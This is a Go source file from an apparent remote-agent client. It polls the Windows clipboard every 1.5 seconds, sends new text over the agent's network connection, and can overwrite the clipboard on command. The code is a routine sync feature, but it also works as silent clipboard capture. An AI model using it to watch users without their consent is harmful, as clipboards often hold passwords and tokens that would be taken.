//go:build windows

package handlers

import (
	"context"
	"log"
	"time"
	"unsafe"

	"overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/wire"

	"golang.org/x/sys/windows"
)

var (
	cbUser32             = windows.NewLazySystemDLL("user32.dll")
	cbKernel32           = windows.NewLazySystemDLL("kernel32.dll")
	procOpenClipboardCB  = cbUser32.NewProc("OpenClipboard")
	procCloseClipboardCB = cbUser32.NewProc("CloseClipboard")
	procGetClipboardCB   = cbUser32.NewProc("GetClipboardData")
	procEmptyClipboard   = cbUser32.NewProc("EmptyClipboard")
	procSetClipboardData = cbUser32.NewProc("SetClipboardData")
	procGlobalAllocCB    = cbKernel32.NewProc("GlobalAlloc")
	procGlobalLockCB     = cbKernel32.NewProc("GlobalLock")
	procGlobalUnlockCB   = cbKernel32.NewProc("GlobalUnlock")
	procRtlMoveMemory    = cbKernel32.NewProc("RtlMoveMemory")
)

const (
	cbCFUnicodeText = 13
	cbGMEMMoveable  = 0x0002
)

func clipboardSyncRead() string {
	r, _, _ := procOpenClipboardCB.Call(0)
	if r == 0 {
		return ""
	}
	defer procCloseClipboardCB.Call()
	h, _, _ := procGetClipboardCB.Call(cbCFUnicodeText)
	if h == 0 {
		return ""
	}
	ptr, _, _ := procGlobalLockCB.Call(h)
	if ptr == 0 {
		return ""
	}
	defer procGlobalUnlockCB.Call(h)
	n := 0
	for {
		v := *(*uint16)(unsafe.Pointer(ptr + uintptr(n)*2))
		if v == 0 {
			break
		}
		n++
		if n > 1<<20 {
			break
		}
	}
	u16 := unsafe.Slice((*uint16)(unsafe.Pointer(ptr)), n)
	return windows.UTF16ToString(u16)
}

func clipboardSyncWrite(text string) error {
	r, _, _ := procOpenClipboardCB.Call(0)
	if r == 0 {
		return windows.ERROR_ACCESS_DENIED
	}
	defer procCloseClipboardCB.Call()

	procEmptyClipboard.Call()

	utf16, err := windows.UTF16FromString(text)
	if err != nil {
		return err
	}
	size := len(utf16) * 2

	hMem, _, _ := procGlobalAllocCB.Call(cbGMEMMoveable, uintptr(size))
	if hMem == 0 {
		return windows.ERROR_NOT_ENOUGH_MEMORY
	}

	ptr, _, _ := procGlobalLockCB.Call(hMem)
	if ptr == 0 {
		return windows.ERROR_LOCK_FAILED
	}

	procRtlMoveMemory.Call(ptr, uintptr(unsafe.Pointer(&utf16[0])), uintptr(size))
	procGlobalUnlockCB.Call(hMem)

	r, _, _ = procSetClipboardData.Call(cbCFUnicodeText, hMem)
	if r == 0 {
		return windows.ERROR_ACCESS_DENIED
	}
	return nil
}

func ClipboardSyncStart(ctx context.Context, env *runtime.Env, source string) {
	log.Printf("clipboard_sync: starting (%s)", source)
	defer log.Printf("clipboard_sync: stopped (%s)", source)

	ticker := time.NewTicker(1500 * time.Millisecond)
	defer ticker.Stop()

	var lastContent string

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			content := clipboardSyncRead()
			if content == "" || content == lastContent {
				continue
			}
			lastContent = content
			text := content
			if len(text) > 64*1024 {
				text = text[:64*1024]
			}
			msg := wire.ClipboardContent{
				Type:   "clipboard_content",
				Text:   text,
				Source: source,
			}
			if err := wire.WriteMsg(ctx, env.Conn, msg); err != nil {
				log.Printf("clipboard_sync: send failed: %v", err)
			}
		}
	}
}

func ClipboardSyncSet(text string) {
	if len(text) > 64*1024 {
		text = text[:64*1024]
	}
	if err := clipboardSyncWrite(text); err != nil {
		log.Printf("clipboard_sync: write failed: %v", err)
	}
}
